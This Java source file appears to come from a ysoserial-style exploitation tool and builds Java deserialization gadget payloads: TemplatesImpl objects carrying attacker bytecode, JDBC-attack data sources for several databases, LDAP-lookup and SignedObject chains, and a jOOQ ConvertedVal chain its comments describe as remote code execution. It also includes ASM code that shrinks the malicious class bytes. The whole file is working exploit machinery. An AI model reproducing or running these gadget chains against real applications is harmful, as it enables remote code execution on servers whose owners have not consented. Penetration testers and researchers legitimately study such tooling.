package cn.butler.yso.payloads.util;

import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
import java.io.Serializable;
import java.lang.reflect.*;
import java.security.*;
import java.util.HashMap;
import java.util.Map;
import cn.butler.thirdparty.payloads.custom.ClassHandleUtil;
import cn.butler.yso.payloads.custom.CustomCommand;
import javatests.Foo;
import org.objectweb.asm.*;
import com.mchange.v2.c3p0.ComboPooledDataSource;
import dm.jdbc.driver.DmdbRowSet;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import cn.butler.GeneratePayload;
import cn.butler.payloads.ObjectPayload;
import cn.butler.thirdparty.payloads.custom.CommandConstant;
import oracle.jdbc.rowset.OracleCachedRowSet;
import org.apache.commons.dbcp2.datasources.SharedPoolDataSource;
import org.jooq.DataType;
import org.postgresql.ds.PGSimpleDataSource;
import org.springframework.context.support.ClassPathXmlApplicationContext;
import javax.naming.CompositeName;


/*
 * utility generator functions for common jdk-only gadgets
 */
@SuppressWarnings ( {
    "restriction", "rawtypes", "unchecked"
} )
public class Gadgets {

    static {
        // special case for using TemplatesImpl gadgets with a SecurityManager enabled
        System.setProperty(DESERIALIZE_TRANSLET, "true");

        // for RMI remote loading
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
    }

    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";


    public static <T> T createMemoitizedProxy ( final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces ) throws Exception {
        return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
    }


    public static InvocationHandler createMemoizedInvocationHandler ( final Map<String, Object> map ) throws Exception {
        return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
    }


    public static <T> T createProxy ( final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces ) {
        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
        allIfaces[ 0 ] = iface;
        if ( ifaces.length > 0 ) {
            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
        }
        return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
    }


    public static Map<String, Object> createMap ( final String key, final Object val ) {
        final Map<String, Object> map = new HashMap<String, Object>();
        map.put(key, val);
        return map;
    }

    /**
     * 构建多种类型的Getter利用类:
     * 1.JDBCAttack
     * 2.Templateslmpl
     * 3.LdapAttribute
     * 3.SignedObject(二次反序列化比较复杂)
     * @param command
     * @return
     * @throws Exception
     */
    public static Object createGetter(String command) throws Exception {
        if (command.startsWith(CustomCommand.GETTER_JDBC)) {
            command = command.substring(CustomCommand.GETTER_JDBC.length());
            return createJdbcAttackGetter(command);
        }else if(command.startsWith(CustomCommand.GETTER_TEMPlATESIMPL)){
            command = command.substring(CustomCommand.GETTER_TEMPlATESIMPL.length());
            return createTemplatesImpl(command);
        } else if (command.startsWith(CustomCommand.GETTER_TEMPLATESIMPL0)) {
            command = command.substring(CustomCommand.GETTER_TEMPLATESIMPL0.length());
            return createTemplatesImpl0(command);
        } else if(command.startsWith(CustomCommand.GETTER_LDAPATTRIBUTE)){
            command = command.substring(CustomCommand.GETTER_LDAPATTRIBUTE.length());
            return createLdapAttribute(command);
        } else if (command.startsWith(CustomCommand.GETTER_SIGNEDOBJECT)) {
            command = command.substring(CustomCommand.GETTER_SIGNEDOBJECT.length());
            return createSignedObject(command);
        } else if (command.startsWith(CustomCommand.GETTER_CONVERTEDVAL)) {
            command = command.substring(CustomCommand.GETTER_CONVERTEDVAL.length());
            return creatConvertedVal(command);
        }
        return null;
    }

    /**
     * 关于getter方法的ConvertedVal攻击(触发构造方法RCE)
     * @param command
     * @return
     */
    private static Object creatConvertedVal(String command) throws Exception {
        Class clazz1 = Class.forName("org.jooq.impl.Dual");
        Constructor constructor1 = clazz1.getDeclaredConstructors()[0];
        constructor1.setAccessible(true);
        Object table = constructor1.newInstance();

        Class clazz2 = Class.forName("org.jooq.impl.TableDataType");
        Constructor constructor2 = clazz2.getDeclaredConstructors()[0];
        constructor2.setAccessible(true);
        Object tableDataType = constructor2.newInstance(table);

        Class clazz3 = Class.forName("org.jooq.impl.Val");
        Constructor constructor3 = clazz3.getDeclaredConstructor(Object.class, DataType.class, boolean.class);
        constructor3.setAccessible(true);
        Object val = constructor3.newInstance("whatever", tableDataType, false);

        Class clazz4 = Class.forName("org.jooq.impl.ConvertedVal");
        Constructor constructor4 = clazz4.getDeclaredConstructors()[0];
        constructor4.setAccessible(true);
        Object convertedVal = constructor4.newInstance(val, tableDataType);

        Object value = command;
        Class type = ClassPathXmlApplicationContext.class;

        Reflections.setFieldValue(val, "value", value);
        Reflections.setFieldValue(tableDataType, "uType", type);

        return convertedVal;
    }

    /**
     * 关于getter方法的ldap攻击
     * @param ldapCtxUrl 必须是ldap服务器地址:ldap://127.0.0.1:1389
     * @return
     * @throws Exception
     */
    public static Object createLdapAttribute(String ldapCtxUrl) throws Exception {
        Class ldapAttributeClazz = Class.forName("com.sun.jndi.ldap.LdapAttribute");

        Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor(
            new Class[]{String.class});
        ldapAttributeClazzConstructor.setAccessible(true);
        Object ldapAttribute = ldapAttributeClazzConstructor.newInstance(
            new Object[]{"name"});

        Field baseCtxUrlField = ldapAttributeClazz.getDeclaredField("baseCtxURL");
        baseCtxUrlField.setAccessible(true);
        baseCtxUrlField.set(ldapAttribute, ldapCtxUrl);

        Field rdnField = ldapAttributeClazz.getDeclaredField("rdn");
        rdnField.setAccessible(true);
        rdnField.set(ldapAttribute, new CompositeName("a//b"));

//        Method getAttributeDefinitionMethod = ldapAttributeClazz.getMethod("getAttributeDefinition", new Class[]{});
//        getAttributeDefinitionMethod.setAccessible(true);
//        getAttributeDefinitionMethod.invoke(ldapAttribute, new Object[]{});
        return ldapAttribute;
    }

    /**
     * 关于getter方法的SignedObject攻击
     * @param string 是此工具中集成的任意Java原生反序列化利用链
     * @return
     * @throws Exception
     */
    public static Object createSignedObject(String string) throws Exception {
        String[] parts = string.split(":", 2);
        String gadget = parts[0];
        String payload = parts[1];
        Object object = ObjectPayload.Utils.makePayloadObject("YsoAttack",gadget, payload);
        KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("RSA");
        KeyPair keyPair = keyPairGenerator.generateKeyPair();
        PrivateKey aPrivate = keyPair.getPrivate();
        Signature signature = Signature.getInstance("MD5withRSA"); ///
        SignedObject signedObject = new SignedObject((Serializable) object,aPrivate,signature);
        //signedObject.getObject(); 触发方式
        return signedObject;
    }

    /**
     * Postgresql
     * Oracle
     * Dameng
     * Dbcp-H2
     * C3p0-H2
     * C3p0-ibm-db2
     * 关于getter方法的jdbcattack攻击
     * @param command
     * @return
     */
    public static Object createJdbcAttackGetter(String command) throws Exception {
        if (command.startsWith(CustomCommand.JDBCATTACK_POSTGRESQL)){
            command = command.substring(CustomCommand.JDBCATTACK_POSTGRESQL.length());
            PGSimpleDataSource dataSource = new PGSimpleDataSource();
            dataSource.setUrl(command);
            return dataSource;
        }else if(command.startsWith(CustomCommand.JDBCATTACK_ORACLE)){
            command = command.substring(CustomCommand.JDBCATTACK_ORACLE.length());
            OracleCachedRowSet oracleCachedRowSet = new OracleCachedRowSet();
            oracleCachedRowSet.setDataSourceName(command);
            return oracleCachedRowSet;
        }else if(command.startsWith(CustomCommand.JDBCATTACK_DAMENG)){
            command = command.substring(CustomCommand.JDBCATTACK_DAMENG.length());
            DmdbRowSet dmdbRowSet = new DmdbRowSet();
            dmdbRowSet.setDataSourceName(command);
            dmdbRowSet.setReader(null);
            dmdbRowSet.setWriter(null);
            return dmdbRowSet;
        }else if(command.startsWith(CustomCommand.JDBCATTACK_DBCP_H2)){
            command = command.substring(CustomCommand.JDBCATTACK_DBCP_H2.length());
            SharedPoolDataSource dataSource = new SharedPoolDataSource();
            dataSource.setDataSourceName(command);
            return dataSource;
        }else if(command.startsWith(CustomCommand.JDBCATTACK_C3P0_H2)){
            command = command.substring(CustomCommand.JDBCATTACK_C3P0_H2.length());
            ComboPooledDataSource dataSource = new ComboPooledDataSource();
            dataSource.setJdbcUrl(command);
            return dataSource;
        }else if(command.startsWith(CustomCommand.JDBCATTACK_C3P0_IBM_DB2)) {
            command = command.substring(CustomCommand.JDBCATTACK_C3P0_IBM_DB2.length());
            ComboPooledDataSource dataSource = new ComboPooledDataSource();
            dataSource.setJdbcUrl(command);
            return dataSource;
        }
        return null;
    }

    /**
     * TemplatesImpl: 字节码继承AbstractTranslet
     * TemplatesImpl0: 字节码无需继承AbstractTranslet
     * @param command
     * @return
     */
    public static Object createTemplatesImplChoose(String command) throws Exception {
        if(command.startsWith(CustomCommand.GETTER_TEMPlATESIMPL)){
            command = command.substring(CustomCommand.GETTER_TEMPlATESIMPL.length());
            return createTemplatesImpl(command);
        } else if (command.startsWith(CustomCommand.GETTER_TEMPLATESIMPL0)) {
            command = command.substring(CustomCommand.GETTER_TEMPLATESIMPL0.length());
            return createTemplatesImpl0(command);
        }
        return null;
    }

    public static Object createTemplatesImpl ( final String command ) throws Exception {
        if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
            return createTemplatesImpl(
                command,
                Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"));
        }
        // 是否压缩
        if(GeneratePayload.ysoConfig.isCompress()){
            return createCompressTemplatesImpl(command);
        }else{
            return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class);
        }
    }

    private static Object createTemplatesImpl0 ( final String command ) throws Exception {
        if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
            return createTemplatesImpl0(
                command,
                Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
                Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
        }

        // todo TemplatesImpl0: 字节码无需继承AbstractTranslet 是否压缩,得研究目前不能直接使用
//        if(GeneratePayload.ysoConfig.isCompress()){
//            return createCompressTemplatesImpl0(command);
//        }else{
//            return createTemplatesImpl0(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
//        }

        return createTemplatesImpl0(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
    }


    private static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet )
            throws Exception {
        //从ThirtyParty模块生成字节码
        byte[] classBytes = null;
        Object[] objects = (Object [])ObjectPayload.Utils.makePayloadObject("ThirdPartyAttack", "CustomClass", command);
        objects = (Object []) ClassHandleUtil.setSuperClassForClass((String)objects[0],(byte[])objects[1],abstTranslet.getName());
        classBytes = (byte[]) objects[1];

        final T templates = tplClass.newInstance();

        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
            classBytes, ClassFiles.classAsBytes(Foo.class)
        });
        Reflections.setFieldValue(templates, "_name", "P");

        return templates;
    }

    private static <T> T createTemplatesImpl0 ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
        throws Exception {

        byte[] classBytes = null;
        Object[] objects = (Object [])ObjectPayload.Utils.makePayloadObject("ThirdPartyAttack", "CustomClass", command);
        classBytes = (byte[]) objects[1];

        final T templates = tplClass.newInstance();
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
            classBytes, ClassFiles.classAsBytes(Foo.class)
        });

        Reflections.setFieldValue(templates, "_transletIndex", 0);
        Reflections.setFieldValue(templates, "_name", "P");
        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }

    // Reference: 《缩小ysoserial payload体积的几个方法》 https://xz.aliyun.com/t/6227
    public static Object createCompressTemplatesImpl(final String command) throws Exception {
        //从ThirdParty模块中获取字节码
        byte[] classBytes = null;
        Object[] objects = (Object [])ObjectPayload.Utils.makePayloadObject("ThirdPartyAttack", "CustomClass", command);
        objects = (Object [])ClassHandleUtil.setSuperClassForClass((String)objects[0],(byte[])objects[1],AbstractTranslet.class.getName());
        classBytes = (byte[]) objects[1];

        //使用ASM删除LINENUMBER指令,缩小字节码
        byte[] asmResolveBytes = asmResolveClassBytes(classBytes);

        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {asmResolveBytes});
        Reflections.setFieldValue(templates, "_name", "P"); //设置_name名称可以是一个字符
        //其中_tfactory属性可以删除（分析TemplatesImpl得出）
        return templates;
    }

    public static HashMap makeMap ( Object v1, Object v2 ) throws Exception, ClassNotFoundException, NoSuchMethodException, InstantiationException,
            IllegalAccessException, InvocationTargetException {
        HashMap s = new HashMap();
        Reflections.setFieldValue(s, "size", 2);
        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        Reflections.setAccessible(nodeCons);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        Reflections.setFieldValue(s, "table", tbl);
        return s;
    }

    /**
     * ASM缩小恶意类的字节码
     * LINENUMBER指令可以全部删
     * @param bytes
     * @return
     */
    private static byte[] asmResolveClassBytes(byte[] bytes){
        ClassReader cr = new ClassReader(bytes);
        ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_FRAMES);
        int api = Opcodes.ASM9;
        ClassVisitor cv = new ShortClassVisitor(api, cw);
        int parsingOptions = ClassReader.SKIP_DEBUG | ClassReader.SKIP_FRAMES;
        cr.accept(cv, parsingOptions);
        return  cw.toByteArray();
    }
}

class ShortClassVisitor extends ClassVisitor {
    private final int api;

    public ShortClassVisitor(int api, ClassVisitor classVisitor) {
        super(api, classVisitor);
        this.api = api;
    }

    @Override
    public MethodVisitor visitMethod(int access, String name, String descriptor, String signature, String[] exceptions) {
        // delete transform method
        if (name.equals("transform")) {
            return null;
        }
        MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);
        return new ShortMethodAdapter(this.api, mv, name);
    }
}

class ShortMethodAdapter extends MethodVisitor implements Opcodes {

    public ShortMethodAdapter(int api, MethodVisitor mv, String methodName) {
        super(api,mv);
    }

    @Override
    public void visitLineNumber(int line, Label start) {
        // delete line number
    }
}
